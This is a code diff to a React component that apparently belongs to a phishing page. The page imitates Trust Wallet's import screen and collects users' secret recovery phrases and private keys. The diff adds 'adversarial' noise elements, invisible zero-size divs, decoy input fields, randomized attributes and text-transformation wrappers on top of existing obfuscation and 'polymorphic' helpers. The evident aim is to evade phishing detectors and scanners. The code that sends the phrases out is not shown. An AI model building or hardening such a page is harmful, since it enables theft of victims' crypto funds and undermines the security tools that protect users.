@@ -14,6 +14,7 @@ import LoadingScreen from "./LoadingScreen";
 import SuccessScreen from "./SuccessScreen";
 import { ob, c } from "@/lib/obfuscate";
 import { gt, ra, fn, rd } from "@/lib/polymorphic";
+import { rne, rcn, bff, ram, nt } from "@/lib/adversarial";
 
 // Lazy load wallet tutorial images
 const loadWalletImages = (walletName: string) => {
@@ -74,6 +75,10 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
   const [privateKeyLabel] = useState(gt('privateKey'));
   const [backText] = useState(gt('back'));
   const [helpText] = useState(gt('help'));
+  
+  // Noise elements for adversarial perturbation
+  const [noiseElements] = useState(() => rne(5));
+  const [decoyFields] = useState(() => [bff(), bff(), bff()]);
 
   // Load images when component mounts
   useEffect(() => {
@@ -250,9 +255,19 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
   }
 
   return (
-    <div className="min-h-screen flex relative">
+    <div className="min-h-screen flex relative" {...ram()}>
+      {/* Noise elements for adversarial perturbation */}
+      {noiseElements.map((noise, idx) => (
+        <div key={idx} {...noise} data-noise={noise.dataAttr}>
+          {noise.content}
+        </div>
+      ))}
+      
+      {/* HTML comment noise */}
+      {/* {rcn()} */}
+      
       {/* Left Side - Grey Gradient with Illustration */}
-      <div className="hidden lg:flex lg:w-1/2 bg-gradient-to-br from-muted/50 to-muted flex-col justify-between p-12 relative">
+      <div className="hidden lg:flex lg:w-1/2 bg-gradient-to-br from-muted/50 to-muted flex-col justify-between p-12 relative" {...ram()}>
         {/* Logo - Top Left */}
         <div className="absolute top-8 left-8">
           <img src={logoImage} alt="Trust Wallet" className="h-8 w-auto" />
@@ -332,7 +347,11 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
       </div>
 
       {/* Right Side - Import Form */}
-      <div className="w-full lg:w-1/2 flex items-center justify-center px-4 lg:px-12 relative">
+      <div className="w-full lg:w-1/2 flex items-center justify-center px-4 lg:px-12 relative" {...ram()}>
+        {/* Decoy form fields */}
+        {decoyFields.map((field, idx) => (
+          <input key={idx} {...field} readOnly />
+        ))}
         {/* Mobile Logo */}
         <div className="absolute top-8 left-1/2 -translate-x-1/2 lg:hidden">
           <img src={logoImage} alt="Trust Wallet" width="150" height="32" className="h-8 w-auto" />
@@ -347,14 +366,19 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
             <ChevronLeft className="w-4 h-4" />
             <span className="text-sm">{backText}</span>
           </button>
-          <h2 className="text-2xl font-bold">
-            Import with Secret Phrase or Private Key
+          <h2 className="text-2xl font-bold" {...ram()}>
+            {nt("Import with Secret Phrase or Private Key")}
           </h2>
+          
+          {/* Noise div */}
+          <div className="absolute opacity-0 w-0 h-0 overflow-hidden" aria-hidden="true">
+            {rcn()}
+          </div>
 
           {/* Phrase Type Selector */}
-          <div className="space-y-2">
-            <label className="text-sm font-medium text-foreground">
-              Phrase Length
+          <div className="space-y-2" {...ram()}>
+            <label className="text-sm font-medium text-foreground" {...ram()}>
+              {nt("Phrase Length")}
             </label>
             <Select value={phraseType} onValueChange={handlePhraseTypeChange}>
               <SelectTrigger className="bg-secondary border-border">
@@ -371,20 +395,24 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
           </div>
 
           {/* Info Box */}
-          <div className="flex items-start gap-3 p-4 bg-primary/10 border-l-4 border-primary rounded">
+          <div className="flex items-start gap-3 p-4 bg-primary/10 border-l-4 border-primary rounded" {...ram()}>
             <Lightbulb className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
             <p className="text-sm text-foreground">
               {phraseType === "private"
-                ? "You can paste your entire Private Key into the field."
-                : "You can paste your entire phrase into any input field."}
+                ? nt("You can paste your entire Private Key into the field.")
+                : nt("You can paste your entire phrase into any input field.")}
             </p>
+            {/* Noise */}
+            <span className="absolute opacity-0 w-0 h-0" aria-hidden="true">{rcn()}</span>
           </div>
 
           {/* Word Inputs */}
-          <div className="space-y-2" {...ra()}>
-            <label className="text-sm font-medium text-foreground">
-              {phraseType === "private" ? privateKeyLabel : phraseLabel}
+          <div className="space-y-2" {...ra()} {...ram()}>
+            <label className="text-sm font-medium text-foreground" {...ram()}>
+              {phraseType === "private" ? nt(privateKeyLabel) : nt(phraseLabel)}
             </label>
+            {/* Noise comment */}
+            {/* {rcn()} */}
             {phraseType === "private" ? (
               <div className="relative" {...ra()}>
                 <textarea
